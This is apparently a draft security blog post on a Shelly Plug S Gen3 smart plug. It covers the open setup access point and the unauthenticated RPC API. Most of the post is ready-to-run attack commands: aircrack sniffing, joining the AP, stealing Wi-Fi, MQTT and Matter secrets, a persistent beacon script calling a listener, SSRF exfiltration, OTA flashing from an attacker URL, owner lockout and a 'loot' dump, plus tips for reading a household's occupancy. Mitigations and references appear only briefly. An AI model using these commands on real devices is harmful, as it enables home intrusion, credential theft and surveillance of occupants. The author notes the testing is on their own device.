---
title: The smart plug that trusts everyone on its own network
description: The Shelly Plug S Gen3 opens a passwordless setup AP and a no-auth RPC API. Sniffing it on the air, driving it from a phone, and what that hands an attacker.
pubDate: 2026-11-16
tags: ["IoT", "Wi-Fi", "Offensive Security"]
draft: true
---

I like IoT devices because they make a promise they can't keep. "Secure by default", "encrypted", "cloud-protected" - and then you hold one in your hand, press the button that puts it into setup mode, and it opens a Wi-Fi network with no password and an API that will do anything you ask it to.

The Shelly Plug S Gen3 is a lovely little example. It's a Wi-Fi smart plug - you screw it between the wall and your kettle, it talks to an app, it tells you how much power the kettle draws. To set it up, it broadcasts its own access point so your phone can find it. That setup window is where the whole thing falls over.

I'll cover:

- **What the device actually exposes** and why the defaults are the problem
- **A short demo** you can run end to end - sniff it, join it, own it
- **What this looks like on a real plug** in someone's home, not a factory-fresh one

My honest caveat: this is the device in its out-of-the-box state, and everything here is against a plug I own. Point it at someone else's and you're not doing research anymore, you're committing a crime.

---

## What's wrong

Two defaults, stacked on top of each other.

**The setup AP is open.** When the plug is unconfigured (or reset), it broadcasts `ShellyPlugSG3-<mac>` as an `OPN` network - no password, no PSK, nothing.<sup><a href="#references">1</a></sup> Anyone in radio range can join. That's by design, so you can commission it. The problem is it stays reachable the whole time the plug is in that state - the full setup window, not just the seconds you're pairing. On my Gen3 the AP does close once it joins your Wi-Fi; on the newer Gen4 line, Pen Test Partners found it stays up permanently, even after the device is on your home network, until you turn it off by hand. Shelly said firmware 1.8 would close it outside the commissioning window, but as of early 2026 that fix wasn't confirmed shipped.<sup><a href="#references">2</a></sup>

**The RPC API ships with auth off.** Once you're on the plug's network it listens on `192.168.33.1` and answers a JSON-RPC API over plain HTTP. `Shelly.GetDeviceInfo` returns `auth_en: false`. No login.<sup><a href="#references">3</a></sup> The device lists its own attack surface for you - `Shelly.ListMethods` comes back with 120-plus methods - and it'll run every one of them for whoever asks.

Think of it like a hotel room that unlocks itself whenever the previous guest checks out, and leaves a laminated card on the bed listing everything in the minibar. The open AP gets you in the door. The no-auth API is the card.

Put together, anyone who can reach the radio can read the config, flip the switch, scrape secrets, hijack the Wi-Fi settings, steal the Matter pairing code, and push a script that survives reboots. No exploit, no overflow, no CVE - just the API working exactly as documented, for the wrong person.

![Trust model: an attacker in Wi-Fi range joins the open AP with no password, reaches the no-auth RPC API, and fans out to flipping the switch, dumping secrets and persisting a script](/blog/shelly-plug-trusts-everyone/trust-model.svg)

---

## The demo

Kali in a VM, one USB Wi-Fi adapter passed through to it. I do it in two passes: **sniff first** to confirm the network really is open on the air, then **join and drive**.

```bash
sudo apt install -y aircrack-ng nmap jq curl
```

### Sniff it on the air

Kill the things that fight monitor mode, then watch the channels:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

You're looking for one line:

```
BSSID              CH  ENC   ESSID
AA:BB:CC:DD:EE:FF  9   OPN   ShellyPlugSG3-AABBCCDDEEFF
```

`OPN`. That's the whole point. Note the channel and BSSID, lock onto it, and let a capture run while someone opens the app on their phone:

```bash
sudo airodump-ng -c 9 --bssid AA:BB:CC:DD:EE:FF -w shelly_cap wlan0mon
```

Open `shelly_cap-01.cap` in Wireshark later if you want to see the phone chatting to the plug in the clear. For now, the `OPN` line is enough. Stop monitor mode and hand the card back to NetworkManager:

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Join and drive

Connect to the open network like any laptop would:

```bash
nmcli dev wifi connect "ShellyPlugSG3-AABBCCDDEEFF"
export SHELLY=192.168.33.1
```

Ask the plug to describe itself:

```bash
curl -s http://$SHELLY/rpc/Shelly.GetDeviceInfo | jq '{model, ver, auth_en}'
```

`"auth_en": false`. No password is standing between you and the next commands.

Make it list its own attack surface:

```bash
curl -s http://$SHELLY/rpc/Shelly.ListMethods | jq '.methods | length'
```

120-something. Now use them - turn the kettle off and on from a terminal:

```bash
curl -s "http://$SHELLY/rpc/Switch.Set?id=0&on=false" | jq .
curl -s "http://$SHELLY/rpc/Switch.Set?id=0&on=true" | jq .
```

Flipping a plug on and off is the harmless bit. These are the ones that matter:

```bash
# steal the Matter pairing code - scan it into your own Apple/Google Home
# and you keep control after you walk away
curl -s http://$SHELLY/rpc/Matter.GetSetupCode | jq .

# point the plug at YOUR access point
curl -s -X POST http://$SHELLY/rpc/Wifi.SetConfig \
  -d '{"config":{"sta":{"ssid":"EvilAP","pass":"pass123","enable":true}}}' | jq .
```

And the one that makes it persistent - a script that phones home every 30 seconds and is set to survive reboots:

```bash
curl -s -X POST http://$SHELLY/rpc/Script.Create -d '{"name":"beacon"}' | jq .
curl -s -X POST http://$SHELLY/rpc/Script.PutCode \
  -d '{"id":1,"code":"Timer.set(30000,true,function(){Shelly.call(\"HTTP.GET\",{url:\"http://192.168.33.2:8080/beacon?mac=\"+Shelly.getDeviceInfo().mac},function(){});});"}' | jq .
curl -s "http://$SHELLY/rpc/Script.Start?id=1" | jq .
curl -s -X POST http://$SHELLY/rpc/Script.SetConfig -d '{"id":1,"config":{"enable":true}}' | jq .
```

Run `python3 -m http.server 8080` on the laptop first and every half-minute you'll watch the plug call back:

```
192.168.33.1 - - "GET /beacon?mac=AABBCCDDEEFF HTTP/1.1"
```

Clean up after yourself:

```bash
curl -s "http://$SHELLY/rpc/Script.Stop?id=1" | jq .
curl -s -X POST http://$SHELLY/rpc/Script.Delete -d '{"id":1}' | jq .
curl -s http://$SHELLY/rpc/Shelly.FactoryReset | jq .
```

---

## From a phone - no laptop needed

None of the join-and-own part needs Kali. The aircrack kit is only for the sniffing pass, confirming the network is open on the air. Everything after that works from a phone, because the setup AP is open Wi-Fi and the API is plain HTTP on a fixed address.

The only real trick is getting the phone to *stay* on a network with no internet, because by default it wants to run away.

1. **Wi-Fi settings -> tap `ShellyPlugSG3-xxxx`.** It's open, so no password.
2. When it warns **"Internet may not be available, stay connected?"** - say stay. If the phone keeps bouncing you off, turn **mobile data off** for a minute so it can't rescue you onto a better network.
3. If a **"Sign in to network"** captive-portal banner fires, dismiss it and go straight to the address.
4. Browser -> **`http://192.168.33.1`**. The plug serves its own config page - switch, live power, settings, even a script editor. No app, just the page the device hands you.

Every read-only method is a plain GET, so the address bar is the whole toolkit:

```
http://192.168.33.1/rpc/Shelly.GetDeviceInfo   # auth_en:false and all
http://192.168.33.1/rpc/Shelly.ListMethods     # the full method list
http://192.168.33.1/rpc/Switch.Toggle?id=0     # flips the plug
http://192.168.33.1/rpc/Matter.GetSetupCode    # the pairing code
```

The `POST` methods (`Wifi.SetConfig`, `Script.PutCode`) need a request body you can't type into the URL bar - but the device's own script editor runs the beacon/eval code directly, and **Termux** (`pkg install curl`, then the same curl lines above) or an HTTP-request app covers the rest. Still no special tools.

### Is there an app?

Three ways to drive it, depending on how much you want to look like a normal user:

| Option | Source | Cloud account? | What it's for |
|---|---|---|---|
| Shelly Smart Control | Play Store, official | Optional - works local-only if you skip sign-in | The sanctioned owner experience |
| Hestia | F-Droid, third-party | None - no account, no telemetry | A tidy front-end straight onto the Gen2+ HTTP API |
| No app | — | None | Browser for reads and switch control, Termux for the POSTs |

Open the official app to see the experience the owner signed up for, then open a browser to `192.168.33.1` and hit `Shelly.GetDeviceInfo`. The same device answers a stranger with `auth_en:false`. Same plug, no account, no permission.

Two phone gotchas: **private/randomised MAC** is on by default, so the address the plug logs isn't your real one - expected, not a problem. And **Private DNS** set to a hostname can choke local addresses; if `192.168.33.1` won't load, set it to Off/Automatic.

---

## What this looks like on a plug in the wild

The demo device is factory-fresh, so the interesting fields come back empty. On a plug sitting in someone's kitchen, the same no-auth API hands you their life:

```bash
curl -s http://$SHELLY/rpc/Wifi.GetConfig | jq '.sta'   # their home Wi-Fi
curl -s http://$SHELLY/rpc/Mqtt.GetConfig | jq .         # broker + creds
curl -s http://$SHELLY/rpc/Schedule.List | jq .          # daily routine
curl -s "http://$SHELLY/rpc/Switch.GetStatus?id=0" | jq '.apower'  # are they home right now?
```

The Wi-Fi config gets you onto their network. The schedule tells you when the house is empty. The power reading tells you if someone's standing in the kitchen this second. A smart plug is a cheap occupancy sensor you never agreed to install - and here it's reading it out to anyone on the open AP, no questions asked.

| What you pull | Why it matters |
|---|---|
| `Wifi.GetConfig` → SSID + password | Gets you onto their home network |
| `Mqtt.GetConfig` → broker + creds | Pivot into the rest of their home automation |
| `Schedule.List` → on/off routines | When the house is reliably empty |
| `Switch.GetStatus` → live power draw | Whether anyone's home right now |

So how much do you trust the little white box between your wall and your kettle?

---

## How you'd actually stop it

| Default | What to turn on |
|---|---|
| No auth on the API | `Shelly.SetAuth` - set a password the moment you commission it |
| Setup AP left open | Switch to STA mode, disable the AP once it's joined your network |
| Cloud + BLE on | `Cloud.SetConfig` / disable BLE after pairing - fewer open doors |
| Old firmware | `Shelly.Update` - and never OTA from a URL you didn't check |

None of this is a flaw you patch. It's a set of defaults that favour "works in 30 seconds out of the box" over "nobody in the car park can own it." The fix is to close the doors the setup flow leaves open - and to assume the window between unboxing and locking down is the whole game.

Open questions I still want to chase: does enabling auth actually gate *every* method, or just the obvious ones? On the Pro 4PM, Nozomi found around 30 methods that answer before the auth and ACL checks even run (CVE-2025-11243), which is not encouraging.<sup><a href="#references">7</a></sup> And how long does a real plug sit in that open setup state before someone finishes the app flow - seconds, or days?

---

## Appendix - the rest of the attack surface

The section above is the short version. This is everything else I poked at, for when you want the full map instead of the highlights. All of it against a plug I own, all of it over the same no-auth API on `192.168.33.1`.

![Attack surface map: six groups of no-auth RPC methods - flip the load, read config and secrets, steal the Matter pairing code, run code, make it fetch for you (SSRF), and flash firmware or lock the owner out. Four confirmed, two need more testing](/blog/shelly-plug-trusts-everyone/attack-map.svg)

### Enumerate everything, don't guess

The device will brute-describe itself if you ask nicely. Loop every method and dump the response:

```bash
for m in $(curl -s http://$SHELLY/rpc/Shelly.ListMethods | jq -r '.methods[]' | sort); do
  echo "=== $m ==="
  curl -s "http://$SHELLY/rpc/$m" 2>/dev/null | jq . 2>/dev/null
done
```

Most methods answer to a bare GET with no arguments. You don't need to know the API; the API teaches you.

### Config and secret stores worth hitting first

```bash
curl -s http://$SHELLY/rpc/Shelly.GetConfig | jq .    # wifi, cloud, mqtt, ble in one dump
curl -s http://$SHELLY/rpc/KVS.List | jq .            # key-value store - scripts stash tokens here
curl -s http://$SHELLY/rpc/KVS.GetMany | jq .
curl -s http://$SHELLY/rpc/Webhook.List | jq .        # outbound URLs - Home Assistant, IFTTT
curl -s http://$SHELLY/rpc/Wifi.ListAPClients | jq .  # who else is on this AP right now
curl -s http://$SHELLY/rpc/Shelly.GetComponents | jq . # every component on the device
```

The KVS is the sleeper. It's meant for scripts to keep state, which means it's where someone's clever automation quietly parked an API key.

### SSRF - the plug makes requests for you

The `HTTP.GET` / `HTTP.POST` methods take any URL and the plug fetches it.<sup><a href="#references">4</a></sup> On the demo network that's a party trick; on a corporate LAN it's a pivot into things you can't route to yourself.

```bash
python3 -m http.server 8080   # your listener

curl -s -X POST http://$SHELLY/rpc/HTTP.GET \
  -d '{"url":"http://192.168.33.2:8080/ssrf-test"}' | jq .

curl -s -X POST http://$SHELLY/rpc/HTTP.POST \
  -d '{"url":"http://192.168.33.2:8080/exfil","body":"stolen_data"}' | jq .
```

The plug's IP hits your server, not yours. Point it at `169.254.169.254` or an internal host and it'll happily try to reach what the firewall won't let you. **My caveat:** I haven't confirmed how much the firmware restricts the URL scheme/target - that's one to test properly before you claim cloud-metadata reach.

### Script.Eval - run code without even saving a script

`Script.Create` + `PutCode` + `Start` is the persistent path from the demo. For a quick one-shot, `Script.Eval` runs mJS straight off<sup><a href="#references">5</a></sup>:

```bash
curl -s -X POST http://$SHELLY/rpc/Script.Eval \
  -d '{"id":1,"code":"Shelly.getDeviceInfo().mac"}' | jq .
# {"result": "AABBCCDDEEFF"}
```

Arbitrary code execution on the device, no file written. The persistent beacon in the demo is just this with a `Timer.set` and `enable:true` so it comes back after a reboot.

### OTA flash from a URL

```bash
curl -s -X POST http://$SHELLY/rpc/Shelly.Update \
  -d '{"url":"http://YOUR_SERVER/firmware.bin"}' | jq .
```

It'll pull firmware from wherever you point it - and Shelly's update path doing no identity check of its own is already on the record as CVE-2024-48776.<sup><a href="#references">6</a></sup> I have *not* flashed a custom image on mine - bricking a plug for a screenshot isn't worth it - so treat this as "the method exists and takes an attacker URL," not "I ran malicious firmware."

### Denial and lockout

You can also just take it away from the owner. Enable auth with a password only you know, kill the cloud link, or factory-reset it out from under them:

```bash
# lock everyone else out by setting the password yourself
curl -s -X POST http://$SHELLY/rpc/Shelly.SetAuth \
  -d '{"user":"admin","realm":"shellyplugsg3-AABBCCDDEEFF","ha1":"'$(echo -n "admin:shellyplugsg3-AABBCCDDEEFF:hunter2" | md5sum | awk '{print $1}')'"}' | jq .

curl -s -X POST http://$SHELLY/rpc/Cloud.SetConfig -d '{"config":{"enable":false}}' | jq .
curl -s http://$SHELLY/rpc/Shelly.FactoryReset | jq .
```

The one security control the device ships with, `SetAuth`, is itself reachable with no auth - so the attacker can turn it on against the owner.

### Dump everything to disk

For the report afterwards, scrape the lot into a folder:

```bash
mkdir -p loot
for ep in Shelly.GetDeviceInfo Shelly.GetStatus Shelly.GetConfig \
  Wifi.GetConfig Cloud.GetConfig Mqtt.GetConfig BLE.GetConfig \
  Script.List Schedule.List Webhook.List KVS.GetMany; do
  curl -s "http://$SHELLY/rpc/$ep" | jq . > "loot/${ep}.json"
done
ls loot/
```

### The surface in one table

| Method(s) | What it gives you | Confirmed? |
|---|---|---|
| `Shelly.ListMethods` | The full 120+ method map, self-described | yes |
| `Shelly.GetConfig` / `KVS.*` | Wi-Fi, cloud, MQTT, BLE config + stashed tokens | yes |
| `Switch.Set` / `Toggle` | Physical control of whatever's plugged in | yes |
| `Matter.GetSetupCode` | Pairing code - permanent control via your own hub | yes |
| `Wifi.SetConfig` | Repoint the device at an attacker AP | yes |
| `Script.Eval` / `PutCode` | Arbitrary mJS execution, persistent across reboot | yes |
| `HTTP.GET` / `HTTP.POST` | SSRF / exfil through the device | partial - scope untested |
| `Shelly.Update` | OTA flash from an attacker URL | method only - not flashed |
| `Shelly.SetAuth` | Lock the real owner out | yes |
| `Shelly.FactoryReset` | Wipe it remotely | yes |

Two rows in that table I'm still hedging on, and I'd rather say so than oversell them - the SSRF reach and the OTA flash both want a proper test before they go in anything load-bearing.

---

## References

1. Shelly — Web Interface Guide: the device's access point is an open network by default, reached at `192.168.33.1`, and should be disabled once the device is online. <https://www.shelly.com/blogs/documentation/shelly-1pm-web-interface-guide>
2. A. Monie, Pen Test Partners (Feb 2026) — "Shelly IoT door controller config fail": Gen4 devices keep the open setup AP enabled after joining Wi-Fi; a single unauthenticated request to `192.168.33.1` triggers the relay; Shelly said firmware 1.8 would disable the AP outside the commissioning window. <https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/>
3. Shelly — Gen2+ Device Authentication: authentication is off until set with `Shelly.SetAuth` (digest auth over HTTP). <https://shelly-api-docs.shelly.cloud/gen2/General/Authentication/>
4. Shelly — HTTP component (`HTTP.GET` / `HTTP.POST`). <https://shelly-api-docs.shelly.cloud/gen2/ComponentsAndServices/HTTP/>
5. Shelly — Script component (`Script.Create` / `PutCode` / `Eval`). <https://shelly-api-docs.shelly.cloud/gen2/ComponentsAndServices/Script>
6. CVE-2024-48776 (NVD) — Shelly firmware update functionality performs no authentication for actions that require a provable user identity. <https://nvd.nist.gov/vuln/detail/CVE-2024-48776>
7. Nozomi Networks — "Lights Out: … Shelly Pro 4PM": CVE-2025-11243 reaches ~30 API methods before authentication and ACL checks run. <https://www.nozominetworks.com/blog/shelly-pro-4pm-vulnerabilities>
